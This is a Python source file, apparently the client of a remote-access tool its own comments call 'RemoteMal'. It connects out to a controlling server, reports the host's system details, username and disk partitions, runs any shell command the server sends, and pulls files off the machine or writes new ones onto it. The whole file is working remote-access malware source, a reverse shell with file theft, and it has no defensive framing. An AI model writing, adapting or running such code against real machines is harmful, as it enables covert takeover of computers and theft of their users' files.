import socket
import subprocess
import os
import sys
import platform
import time
import psutil
import getpass
import shlex
class RemoteClient(object):

    def __init__(self,Ip,PortId,CharSet="utf-32",Buffering=1024,TimeOut=10):
       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId           #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet         #Character Set For Encoding And Decoding
       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
       self.TimeOut=TimeOut         #TimeOut which is the Maximum Exexcution Time For Command Execution.
       self.RecvBuffer = list()

    def Connect(self):
        #Connect To The Server:
        self.client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        self.client_socket.connect(self.Address)

    def send(self,data):
        #Send data as chunks 
        null_added_data = self.AppendNull(data)
        for i in range(0,len(null_added_data),self.Buffering):
            chunk =null_added_data[i:i+self.Buffering]
            self.client_socket.send(chunk.encode(self.CharSet)) 
        return None


    def recv(self):
        data = ""
        flag = True

        dequeue = self.DequeueHandler()
        if(not dequeue):
            while flag:
                chunk = self.client_socket.recv(self.Buffering).decode(self.CharSet)

                if(len(chunk) >=  1):
                    if(chunk[-1] == '\0'):
                        flag = False
                data += chunk
        
            return self.EnqueueHandler(data.split('\0')) 
        return dequeue

    def bin_send(self,bin_data):
        #Send data as chunks 
        null_added_data = self.bin_AppendNull(bin_data)
        for i in range(0,len(null_added_data),self.Buffering):
            chunk =null_added_data[i:i+self.Buffering]
            self.client_socket.send(chunk) 

        return None

    def bin_recv(self):
        bin_data = b""
        flag = True

        while flag:
            chunk = self.client_socket.recv(self.Buffering)
            if(len(chunk) >=  1):
                if(chunk[-1] == 0):
                    flag = False
            
            bin_data += chunk
    
        return bin_data

    def EnqueueHandler(self,next_data):
        for data in next_data:
            if(not data):
                continue
            self.RecvBuffer.append(data)
        return self.DequeueHandler()

    def DequeueHandler(self):
        if(len(self.RecvBuffer) != 0):
            return self.ByteOrderMark(self.RecvBuffer.pop(0)).replace('\\x00','\x00')
        return None

    def ByteOrderMark(self,data):
        try:
            return data.replace('\ufeff','') #Remove BOM charcter if it exists.
        except:
            return data

    def DownloadTextFile(self,file_path):

        # Check if the file exists
        if os.path.exists(file_path):
            self.send("True")
            is_dld_path_exist = self.recv()
            if(is_dld_path_exist == "True"):
                with open(file_path,mode = 'r') as file:
                    file_content = file.read()
                    self.send(file_content)
            else:
                return None
        else:
            self.send("False")


    def DownloadedBinaryFile(self,file_path):
        # Check if the file exists
        if os.path.exists(file_path):
            
            self.send("True")
            is_dld_path_exist = self.recv()
            if(is_dld_path_exist == "True"):
                with open(file_path,mode = 'rb') as file:
                    file_content = file.read()
                    self.bin_send(file_content)
            else:
                return None
        else:
            self.send("False")

    def UploadTextFile(self,file_path):
        is_file_exist = self.recv()
        if(is_file_exist == "True"):
            upld_path = self.recv()
            file_name = self.recv()
            if(os.path.exists(upld_path)):
                self.send("True")
                with open(upld_path + '/' + file_name,mode='w') as file:
                    file_content = self.recv()
                    if(not file_content):
                        file.write('')
                    else:
                        file.write(file_content)
                self.send("True")
            else:
                self.send("False")
        else:
            return None

    def UploadBinaryFile(self,file_path):
        is_file_exist = self.recv()
        if(is_file_exist == "True"):
            upld_path = self.recv()
            file_name = self.recv()
            if(os.path.exists(upld_path)):
                self.send("True")
                with open(upld_path + '/' + file_name,mode='wb') as file:
                    file_content = self.bin_recv()
                    if(not file_content):
                        file.write('')
                    else:
                        file.write(file_content)
                self.send("True")
            else:
                self.send("False")
        else:
            return None


    def GetBuffer(self):
        #Recieve the Buffer From Server Side
        return self.recv() 

    def SetBuffer(self):
        #Change The Value Of Buffering
        self.Buffering=int(self.GetBuffer())

    def LocationOfFile(self):
        #Send The  Location of the <client>  File Downloaded Path
        self.path=os.getcwd()
        self.send(self.path)
        return None

    def AppendNull(self, data):
        data = data.replace('\x00','\\x00')
        return data + '\0'

    def bin_AppendNull(self, bin_data):
        return bin_data + b'\0'

    def Partitions(self):
        #Get the Partitions of the system
        partitions,mountpoints="",""
        for partition in psutil.disk_partitions():
                partitions+=partition.device
                mountpoints+=partition.mountpoint
        self.send(partitions)
        self.send(mountpoints)

    def PartitionsInfo(self):
        #Get the Partitions information such as Name,Mountpoint,(Fixed,Removed),MemorySize
        partitions_info=""
        for partition in psutil.disk_partitions():
            try:
                Memory_size=psutil.disk_usage(partition.mountpoint).total/(1024*1024*1024)
            except OSError:
                Memory_size=-1
            partitions_info+=f"{partition.device}\t{partition.mountpoint}\t{partition.opts}\t{int(Memory_size)}"+"\n"
        self.send(partitions_info)

    def SysPlatform(self):
        #Retrieve the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=sys.platform
        self.send(self.platform)

    def SysInfo(self):
        #Retrieve the System information of the client
        Info=f"""System<:>{platform.system()}<,>Release<:>{platform.release()}<,>Version<:>{platform.version()}<,>Architecture<:>{platform.machine()}\nProcessor<:>{platform.processor()}<,>Physical Cores<:>{os.cpu_count()}<,>Total Cores<:>{os.cpu_count()}"""
        self.send(Info)

    def GetUserAndDevice(self):
        #Get the User name and Device of the Current User
        self.send(getpass.getuser())
        self.send(platform.node())


    def VerifyPath(self):
        #check whether the path is correct or not
        path=self.recv()
        try:
            os.chdir(path)
            self.path=path 
            self.send("TRUE")
        except Exception as e:
            self.send("FALSE")
    
    def close(self)->None:
        #close the socket connection.
        self.client_socket.close()
        sys.exit(0)         #Exit the program with success code 0
        return None


    def _exe_cmd(self,cmd,input="\n"):

        cmd_list=shlex.split(cmd)
        try:
            #Creating a new process for remote command execution 
            self.process=subprocess.Popen(["cmd.exe","/c"]+cmd_list,universal_newlines=True,cwd=self.path,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout,stderr=self.process.communicate(input=input,timeout=self.TimeOut)

            #Sends the flag for the data is stdout or stderr
            self.send(stdout) if (stdout) else self.send("Yes") if (stderr) else self.send("No")
            #Sends the output if the command has any output 
            #sends the error if the command has any error
            #Sends <Command Executed successfully> if no output or error for the executed command
            self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")

        except Exception as error:
            self.send("Yes")
            self.send(str(error))

    def _exe_Terminal(self,cmd,input="\n"):

        #split command based on shell input
        cmd_list=shlex.split(cmd)
        try:
            #Creating a new process for remote command execution 
            self.process=subprocess.Popen(cmd_list,universal_newlines=True,cwd=self.path,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout,stderr=self.process.communicate(input=input,timeout=self.TimeOut)

            #Sends the flag for the data is stdout or stderr
            self.send(stdout) if (stdout) else self.send("Yes") if (stderr) else self.send("No")
            #Sends the output if the command has any output 
            #sends the error if the command has any error
            #Sends <Command Executed successfully> if no output or error for the executed command   
            self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")


        except Exception as error:
            self.send("Yes")
            self.send(error.__str__())

    

    def main(self):
        #Entry Point of the Program

        if(self.platform=="win32"):
            
            #The code Block windows command execution
            while(True):

                
                cmd=self.recv() #Recieve the command to be executed

                if(not cmd):
                    continue
                
                if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
                    self.VerifyPath()      #It sets path variable to its previous state if path is not valid   

                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-dld -t "):].replace("\\","/")
                    if(option == '-t'):
                        self.DownloadTextFile(file_path)
                    elif(option == '-b'):
                        self.DownloadedBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")

                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-upld -t "):].replace("\\","/")
                    if(option == '-t'):
                        self.UploadTextFile(file_path)
                    elif(option == '-b'):
                        self.UploadBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")

                elif(cmd.lower()=="remotequit"):
                    self.close()    #Close the Socket Connection.

                else:
                    flag=self.recv()     #Recieve the flag(Y or N) to verify the command needs input or not

                    if (flag.upper()=="Y"):
                        stdin=self.recv()+"\n"
                        self._exe_cmd(cmd,stdin) # Execute the command with input
                    else:
                        self._exe_cmd(cmd) #Execute the command without input


        elif(self.platform=="linux" or self.platform=="darwin"):

            #The code Block linux or Mac command execution
            while(True):

                
                cmd=self.recv() #Recieve the command to be executed

                if(not cmd):
                    continue

                if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
                    self.VerifyPath()      #It sets path variable to its previous state if path is not valid   

                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-dld -t "):].replace("\\","/")
                    if(option == '-t'):
                        self.DownloadTextFile(file_path)
                    elif(option == '-b'):
                        self.DownloadedBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")

                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-upld -t "):].replace("\\","/")
                    if(option == '-t'):
                        self.UploadTextFile(file_path)
                    elif(option == '-b'):
                        self.UploadBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")

                elif(cmd.lower()=="remotequit"):
                    self.close()    #Close the Socket Connection.

                else:
                    flag=self.recv()     #Recieve the flag(Y or N) to verify the command needs input or not

                    if (flag.upper()=="Y"):
                        stdin=self.recv()+"\n"
                        self._exe_Terminal(cmd,stdin) # Execute the command with input
                    else:
                        self._exe_Terminal(cmd) #Execute the command without input
                
        else:
            #RemoteMal Can only work on (Windows,linux,mac) Any other platform will not be Accepted
            self.close() #Close the connection between client and server







        
if __name__=="__main__":
    r=RemoteClient("127.0.0.1",5066)
    r.Connect()
    r.SetBuffer()
    r.Partitions()
    r.LocationOfFile()
    r.SysPlatform()
    r.SysInfo()
    r.PartitionsInfo()
    r.GetUserAndDevice()
    r.main()
#######################################################################################################################################
